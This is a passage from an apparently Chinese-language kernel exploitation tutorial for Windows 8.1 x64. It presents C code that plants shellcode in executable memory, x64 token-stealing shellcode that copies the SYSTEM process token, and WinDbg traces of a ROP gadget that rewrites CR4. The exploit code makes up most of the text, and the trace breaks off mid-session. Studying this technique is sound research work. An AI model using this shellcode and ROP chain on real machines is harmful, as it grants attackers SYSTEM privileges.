# 0x00：Windows 8.1 x64的一个坑
首先我们回顾一下我们在[上篇](https://xz.aliyun.com/t/5890)的利用中可能存在的一个坑
**Shellcode的构造**
上篇我只是简单提了一下内核中构造放置我们的shellcode，如果你看了我的源码，里面的构造函数如下所示：
    VOID ConstrutShellcode()
    {
        printf("[+]Start to construt Shellcode\n");
        VOID* shellAddr = (void*)0x100000;
        shellAddr = VirtualAlloc(shellAddr, 0x1000, MEM_RESERVE | MEM_COMMIT, PAGE_EXECUTE_READWRITE);
        memset(shellAddr, 0x41, 0x1000);
        CopyMemory((VOID*)0x100300, ShellCode, 0x200);
        //__debugbreak();
        UINT64* recoverAddr = (UINT64*)((PBYTE)(0x100300) + 0x44);
        *(recoverAddr) = (DWORD64)ntoskrnlbase() + 0x4c8f75; // nt!KeQueryIntervalProfile+0x25
    }
你可能会疑惑`recoverAddr`这个东西是拿来做什么用的，先不要着急我们在看看我们shellcode的实现：
    .code
    ShellCode proc
        ; shellcode编写
        mov rax, gs:[188h]
        mov rax, [rax+220h]
        mov rcx, rax
        mov rdx, 4
    findSystemPid:
        mov rax, [rax+2e8h]
        sub rax, 2e8h
        cmp [rax+2e0h], rdx
        jnz findSystemPid
        mov rdx, [rax+348h]
        mov [rcx+348h], rdx
        sub rsp,30h                     ;堆栈平衡
        mov rax, 0aaaaaaaaaaaaaaaah      ;这个位置放进入Gadgets返回后的后半部分函数
        mov [rsp], rax
        ret
    ShellCode endp
    end
从上面可以看到，我在最后的地方用了几句汇编将堆栈平衡了，这其实是我调试了很久才得到的结果，我简单提一下这个过程，首先我们知道我们把shellcode放置在了0x100300的位置，我们还知道我们需要执行我们的ROP，所以我们需要在windbg中下两个硬件断点观察，注意shellcode中不能用int
3下软件断点，这样会修改堆栈的平衡导致一些问题
    1: kd> u nt!KiConfigureDynamicProcessor+0x40
    nt!KiConfigureDynamicProcessor+0x40:
    fffff803`20ffe7cc 0f22e0          mov     cr4,rax
    fffff803`20ffe7cf 4883c428        add     rsp,28h
    fffff803`20ffe7d3 c3              ret
    ...
    1: kd> ba e1 fffff803`20ffe7cc
    1: kd> u 100300
    00000000`00100300 65488b042588010000 mov   rax,qword ptr gs:[188h]
    00000000`00100309 488b8020020000  mov     rax,qword ptr [rax+220h]
    00000000`00100310 488bc8          mov     rcx,rax
    ...
    1: kd> ba e1 00000000`00100300
我们g运行到第一个断点，t单步到ret处，查看堆栈结构和我们现在rc4寄存器的值，可以发现我们的寄存器已经被修改
    1: kd> g
    Breakpoint 0 hit
    nt!KiConfigureDynamicProcessor+0x40:
    fffff803`20ffe7cc 0f22e0          mov     cr4,rax
    1: kd> t
    nt!KiConfigureDynamicProcessor+0x43:
    fffff803`20ffe7cf 4883c428        add     rsp,28h
    1: kd> t
    nt!KiConfigureDynamicProcessor+0x47:
    fffff803`20ffe7d3 c3              ret
    1: kd> dqs rsp
    ffffd000`27acf9a0  00000000`00100300
    ffffd000`27acf9a8  00000000`00000000
    ffffd000`27acf9b0  00000000`00000000
    ffffd000`27acf9b8  00000000`00000000
    ffffd000`27acf9c0  00000000`00000000
    ffffd000`27acf9c8  fffff803`2114ff36 nt!NtQueryIntervalProfile+0x3e
    ffffd000`27acf9d0  00000000`00000000
    ffffd000`27acf9d8  00000000`00000000
    ffffd000`27acf9e0  00000000`00000000
    ffffd000`27acf9e8  00000000`00000000
    ffffd000`27acf9f0  00000000`00000000
    ffffd000`27acf9f8  fffff803`20de28b3 nt!KiSystemServiceCopyEnd+0x13
    ffffd000`27acfa00  ffffe000`01b9a4c0
    ffffd000`27acfa08  00007ffe`00000008
    ffffd000`27acfa10  ffffffff`fff85ee0
    ffffd000`27acfa18  ffffd000`00000008
    1: kd> r cr4
    cr4=00000000000406f8
我们t单步再次观察堆栈，这里已经开始执行我们的shellcode了
    1: kd> t
    00000000`00100300 65488b042588010000 mov   rax,qword ptr gs:[188h]
    1: kd> dqs rsp
    ffffd000`27acf9a8  00000000`00000000
    ffffd000`27acf9b0  00000000`00000000
    ffffd000`27acf9b8  00000000`00000000
    ffffd000`27acf9c0  00000000`00000000
    ffffd000`27acf9c8  fffff803`2114ff36 nt!NtQueryIntervalProfile+0x3e
    ffffd000`27acf9d0  00000000`00000000
    ffffd000`27acf9d8  00000000`00000000
    ffffd000`27acf9e0  00000000`00000000
    ffffd000`27acf9e8  00000000`00000000
    ffffd000`27acf9f0  00000000`00000000
    ffffd000`27acf9f8  fffff803`20de28b3 nt!KiSystemServiceCopyEnd+0x13
    ffffd000`27acfa00  ffffe000`01b9a4c0
    ffffd000`27acfa08  00007ffe`00000008
    ffffd000`27acfa10  ffffffff`fff85ee0
    ffffd000`27acfa18  ffffd000`00000008
    ffffd000`27acfa20  000000bf`00000000
我们继续单步运行到shellcode中`sub
rsp,30h`的位置，查看堆栈之后继续单步，我们可以看到rsp中内容被修改为了0x010033e，而0x010033e中存放的内容正是我们`nt!KeQueryIntervalProfile+0x25`中的值
    1: kd> t
    00000000`0010033e 4883ec30        sub     rsp,30h
    1: kd> dqs rsp
    ffffd000`27acf9a8  00000000`00000000
    ffffd000`27acf9b0  00000000`00000000
    ffffd000`27acf9b8  00000000`00000000
    ffffd000`27acf9c0  00000000`00000000
    ffffd000`27acf9c8  fffff803`2114ff36 nt!NtQueryIntervalProfile+0x3e
    ffffd000`27acf9d0  00000000`00000000
    ffffd000`27acf9d8  00000000`00000000
    ffffd000`27acf9e0  00000000`00000000
    ffffd000`27acf9e8  00000000`00000000
    ffffd000`27acf9f0  00000000`00000000
    ffffd000`27acf9f8  fffff803`20de28b3 nt!KiSystemServiceCopyEnd+0x13
    ffffd000`27acfa00  ffffe000`01b9a4c0
    ffffd000`27acfa08  00007ffe`00000008
    ffffd000`27acfa10  ffffffff`fff85ee0
    ffffd000`27acfa18  ffffd000`00000008
    ffffd000`27acfa20  000000bf`00000000
    1: kd> t
    00000000`00100342 48b875ff142103f8ffff mov rax,offset nt!KeQueryIntervalProfile+0x25 (fffff803`2114ff75)
    1: kd> dqs rsp
    ffffd000`27acf978  00000000`0010033e
    ffffd000`27acf980  00000000`00000010
    ffffd000`27acf988  00000000`00000344
    ffffd000`27acf990  ffffd000`27acf9a8
    ffffd000`27acf998  00000000`00000018
    ffffd000`27acf9a0  00000000`00100300